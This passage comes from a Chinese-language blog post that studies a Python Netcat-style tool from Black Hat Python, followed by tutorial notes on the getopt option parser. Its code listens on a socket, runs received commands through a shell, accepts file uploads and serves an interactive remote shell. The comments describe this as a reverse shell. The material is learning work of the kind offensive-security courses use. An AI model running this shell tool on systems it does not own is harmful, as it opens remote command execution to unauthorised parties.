data-num=\"40\"></td><td><pre>        opts<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> getopt<span class=\"token punctuation\">.</span>getopt<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hle:t:p:cu:\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"help\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"execute=\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"target=\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"port=\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"command\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"upload=\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">except</span> getopt<span class=\"token punctuation\">.</span>GetoptError <span class=\"token keyword\">as</span> err<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        usage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">for</span> o<span class=\"token punctuation\">,</span> a <span class=\"token keyword\">in</span> opts<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--help\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            usage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-l\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            listen <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-e\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--execute\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            execute <span class=\"token operator\">=</span> a</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-t\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--target\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            target <span class=\"token operator\">=</span> a</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-p\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--port\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--command\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            command <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-u\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--upload\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            upload_destination <span class=\"token operator\">=</span> a</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token keyword\">assert</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Unhandled Option\"</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token comment\"># 我们是进行监听还是仅从标准输入发送数据？</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> listen <span class=\"token keyword\">and</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> port <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    \t<span class=\"token comment\"># 从命令行读取内存数据</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    \t<span class=\"token comment\"># 这里将阻塞，所以不在向标准输入发送数据时发送 ctrl-D</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token comment\"># 发送数据</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        client_sender<span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token comment\"># 我们开始监听并准备上传文件、执行命令</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token comment\"># 放置一个反弹 shell</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token comment\"># 取决于上面得命令行选项</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">if</span> listen<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        server_loop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">server_loop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">global</span> target</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t<span class=\"token comment\"># 如果没有定义目标，那么我们监听所有接口</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        target <span class=\"token operator\">=</span> <span class=\"token string\">\"0.0.0.0\"</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    server <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    server<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    server<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        client_socket<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">=</span> server<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token comment\"># 分析一个线程处理新的客户端</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        client_thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>client_handler<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        client_thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">client_sender</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token comment\"># 连接到目标主机</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    client <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        client<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            client<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        \t<span class=\"token comment\"># 现在等待数据回传</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            recv_len <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            response <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">while</span> recv_len<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>                data <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                recv_len <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>                response <span class=\"token operator\">+=</span> data</pre></td></tr><tr><td data-num=\"109\"></td><td><pre>                <span class=\"token keyword\">if</span> recv_len <span class=\"token operator\">&lt;</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                    <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>            <span class=\"token comment\"># 等待更多输入</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>            <span class=\"token comment\"># 这里 python2 使用的是 raw_input ()，在 python3 中取消了此函数，input () 可以起到相同的作用</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>            <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>            <span class=\"token builtin\">buffer</span> <span class=\"token operator\">+=</span> <span class=\"token string\">'\\n'</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>            <span class=\"token comment\"># 发送数据</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>            client<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] Exception! Exiting.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token comment\"># 关闭连接</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        client<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run_command</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t<span class=\"token comment\"># 处理多余得空格和换行符</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    command <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    \t<span class=\"token comment\"># 先解码，再执行命令</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        command <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>        <span class=\"token comment\"># 运行命令并将输出返回</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>        output <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">,</span> stderr<span class=\"token operator\">=</span>subprocess<span class=\"token punctuation\">.</span>STDOUT<span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>        <span class=\"token comment\"># 这里所返回的命令结果都是以系统 shell 默认编码的形式返回。</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>        output <span class=\"token operator\">=</span> <span class=\"token string\">b\"Failed to execute command.\\r\\n\"</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token comment\"># 将输出发送</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token keyword\">return</span> output</pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">client_handler</span><span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t<span class=\"token comment\"># 检测上传文件</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>upload_destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    \t<span class=\"token comment\"># 读取所有都字符并写下目标</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>        file_buffer <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>        <span class=\"token comment\"># 持续读取数据直到没有符合得数据</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>            data <span class=\"token operator\">=</span> client_socket<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>                file_buffer <span class=\"token operator\">+=</span> data</pre></td></tr><tr><td data-num=\"151\"></td><td><pre>        <span class=\"token comment\"># 现在我们接受这些数据并将他们写出来</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>            <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>upload_destination<span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> file_descriptor<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>                file_descriptor<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>file_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>                client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'Successfully saved file to %s'</span> <span class=\"token operator\">%</span> upload_destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'Failed saved file to %s'</span> <span class=\"token operator\">%</span> upload_destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>\t<span class=\"token comment\"># 检查执行命令</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>execute<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>        output <span class=\"token operator\">=</span> run_command<span class=\"token punctuation\">(</span>execute<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>        client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t<span class=\"token comment\"># 如果需要一个命令行 shell，那么我们进入另一个循环</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    <span class=\"token keyword\">if</span> command<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>        \t<span class=\"token comment\"># 跳出一个窗口</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'&lt;BHP:#>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>            cmd_buffer <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>            cmd_buffer <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>cmd_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>            <span class=\"token comment\"># 现在我们接收文件直到发现换行符</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token string\">'\\n'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> cmd_buffer<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>                cmd_buffer <span class=\"token operator\">+=</span> client_socket<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>            <span class=\"token comment\"># 返还命令输出</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>            response <span class=\"token operator\">=</span> run_command<span class=\"token punctuation\">(</span>cmd_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>            <span class=\"token comment\"># 这里使用 detect 函数进行判断字节编码，并按照结果进行解码。</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>            btype <span class=\"token operator\">=</span> chardet<span class=\"token punctuation\">.</span>detect<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>            <span class=\"token keyword\">if</span> btype<span class=\"token punctuation\">[</span><span class=\"token string\">'encoding'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'GB2312'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>                response <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'gbk'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>                response <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>            <span class=\"token comment\"># 发送响应数据</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"前提学习\"><a class=\"anchor\" href=\"#前提学习\">#</a> 前提学习</h1>\n<p>没有用过 getopt 库（可之前学了 optparse 库，optparse 也能实现这个功能），于是就去学 getopt 库</p>\n<h2 id=\"getopt库学习\"><a class=\"anchor\" href=\"#getopt库学习\">#</a> getopt 库学习</h2>\n<p>getopt 是一个命令行选项解析器。<br />\ngetopt 的函数之一：<br />\ngetopt.getopt(args, shortopts, longopts=[])</p>\n<ul>\n<li>\n<p>args 为要解析的参数列表，不包含 argv [0]，即：文件名。</p>\n</li>\n<li>\n<p>shortopts 为脚本所要识别的字母选项，如：-h</p>\n</li>\n<li>\n<p>longopts 为一个被支持的长选项名称组成的列表，如：--help</p>\n</li>\n</ul>\n<p>关于 shortopts：<br />\nshortopts 是一个字母；<br />\n它可以写成纯字符：o，也可以写成带一个 - 的形式：-o。<br />\n如果某一个选项后面有参数，那么它的后面就会带一个冒号：o: 或者 - o:。<br />\n当有好几个短操作参数时，可以直接写到一起：'abcd' 或者 '-abcd' 或者 '-ab-c-d'，可随意组合。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> getopt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>parses <span class=\"token operator\">=</span> <span class=\"token string\">\"-c -p 3306 -h 192.168.1.1 a1 a2\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>optlist<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> getopt<span class=\"token punctuation\">.</span>getopt<span class=\"token punctuation\">(</span>parses<span class=\"token punctuation\">,</span> <span class=\"token string\">'cp:h:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>输出</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>>>> optlist</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>[('-c', ''), ('-p', '3306'), ('-h', '192.168.1.1')]</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>>>> args</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>['a1', 'a2']</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>'''</span></pre></td></tr></table></figure><p>关于 longopts:<br />\nlongopts 必须写在 [] 中，且放在一对单引号中：['--help']<br />\n 如果想承接参数，则要在后面加一个 =：['--help=']<br />\n longopts 必须用逗号隔开，且每个都在一对单引号中</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>使用长选项名的例子：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">import</span> getopt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> s <span class=\"token operator\">=</span> <span class=\"token string\">'--condition=foo --testing --output-file abc.def -x a1 a2'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> args <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>split<span class=\"token 